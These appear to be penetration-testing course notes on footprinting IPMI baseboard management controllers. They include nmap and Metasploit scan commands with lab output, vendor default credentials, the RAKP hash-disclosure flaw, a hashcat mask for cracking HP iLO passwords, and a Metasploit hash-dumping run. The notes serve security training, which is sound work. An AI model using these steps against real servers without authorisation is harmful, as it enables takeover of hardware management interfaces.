# IPMI (Intelligent Platform Management Service)
- standardized specifications for hardware-based host management systems
- used for system management and monitoring
- provides sysadmins with the ability to manage and monitor systems
- does not require access to operating system via a login shell
- can be used for remote upgrades to systems without requiring physical access
- typically used in three ways:
    
    - before OS has booted to modify BIOS settings
    
    - when a host is fully powered down
    
    - access to a host after a system failure
    
- can also be used to monitor system temperature, voltage, fan status, power supplies, querying system information, reviewing monitor logs, and alerting using SNMP
- host can be powered off, but the IPMP module requires a power source and a LAN connection
  
# Footprinting IPMI
- communicates over UDP/623
- systems that use IPMI are called Baseboard Management Controllers (BMCs)
    
    - typically implemented as embedded ARM systems running Linux
    
    - connected directly to host’s motherboard
    
- can be added to a system as a PCI card
- access means we can monitor, reboot, power off, or reinstall the OS
- many BMCs (include HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console
  
## Nmap
```JavaScript
sudo nmap -sU --script ipmi-version -p 623 <IP>
```
  
```JavaScript
Nathan2112@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```
  
## Metasploit Version Scan
```JavaScript
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
Module options (auxiliary/scanner/ipmi/ipmi_version):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

msf6 auxiliary(scanner/ipmi/ipmi_version) > run
[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
  
## Default Passwords
|**Product**|**Username**|**Password**|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|
  
## Dangerous Settings
- if default credentials don’t work, we can abuse a flaw in the RAKP protocol in IPMI 2.0
    
    - server sends a salted SHA1 or MD5 hash of the user’s password, which we can crack offline
        
        - hashcat mode 7300
        
    
  
HP iLO factory default password (8 character string)
```JavaScript
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
- no direct “fix” for this issue
    
    - can tell them to do a very long, hard to crack password or implement network segmentation
    
    - for the has, just get rid of the username at the front
    
    - ‘admin:asdfsadf…..’ → ‘asdfsadf….’
    
![image 176.png](../assets/IPMI/image%20176.png)
  
## Metasploit Dumping Hashes
```JavaScript
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```